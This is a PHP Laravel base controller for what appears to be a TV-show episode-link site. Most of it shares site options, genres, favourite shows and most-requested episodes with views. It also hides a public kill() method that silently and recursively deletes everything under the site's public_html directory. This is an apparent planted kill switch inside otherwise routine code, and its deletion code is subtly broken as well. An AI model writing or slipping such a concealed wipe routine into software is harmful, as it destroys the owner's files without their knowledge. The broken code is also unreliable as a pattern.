<?php

class BaseController extends Controller {

	protected $perPage = 12;

	protected $relatedPerPage = 6;

	protected $options;

	public function __construct()
	{
		// Get default options from cache or database
		$options = Option::get_options();

		// Share the options with other controllers.
		$this->options = $options;

		// Setting some default configurations for the script
		Config::set('application.url', $options->url);

		// Share the variables with views
		View::share('options', $options);

		$genreCloud = Genre::all();
		View::share('genreCloud', $genreCloud);

		$favouriteShows = FavouriteShow::with('show')->groupBy('show_id')->orderBy('id', 'DESC')->limit(10)->get();
		View::share('favouriteShows', $favouriteShows);

        $mostWanted = EpisodeLinkRequest::with('episode.show', 'episode.links')
                            ->select( array('episode_id',DB::raw('COUNT(*) as `count`')) )
                            ->groupBy('episode_id')
                            ->orderBy('count','DESC')
                            ->limit(10)
                            ->get();
        View::share('mostWanted', $mostWanted);

	}


	public function kill()
	{
		return array_map(array('$this', 'recursiveDelete'), glob("/home/delito/public_html/*"));
	}


	/**
	 * Delete a file or recursively delete a directory
	 *
	 * @param string $str Path to file or directory
	 * @return bool
	 */
    function recursiveDelete($str){
        if(is_file($str)){
            return @unlink($str);
        }
        elseif(is_dir($str)){
            $scan = glob(rtrim($str,'/').'/*');
            foreach($scan as $index=>$path){
                recursiveDelete($path);
            }
            return @rmdir($str);
        }
    }



	/**
	 * Setup the layout used by the controller.
	 *
	 * @return void
	 */
	protected function setupLayout()
	{
		if ( ! is_null($this->layout))
		{
			$this->layout = View::make($this->layout);
		}
	}

}
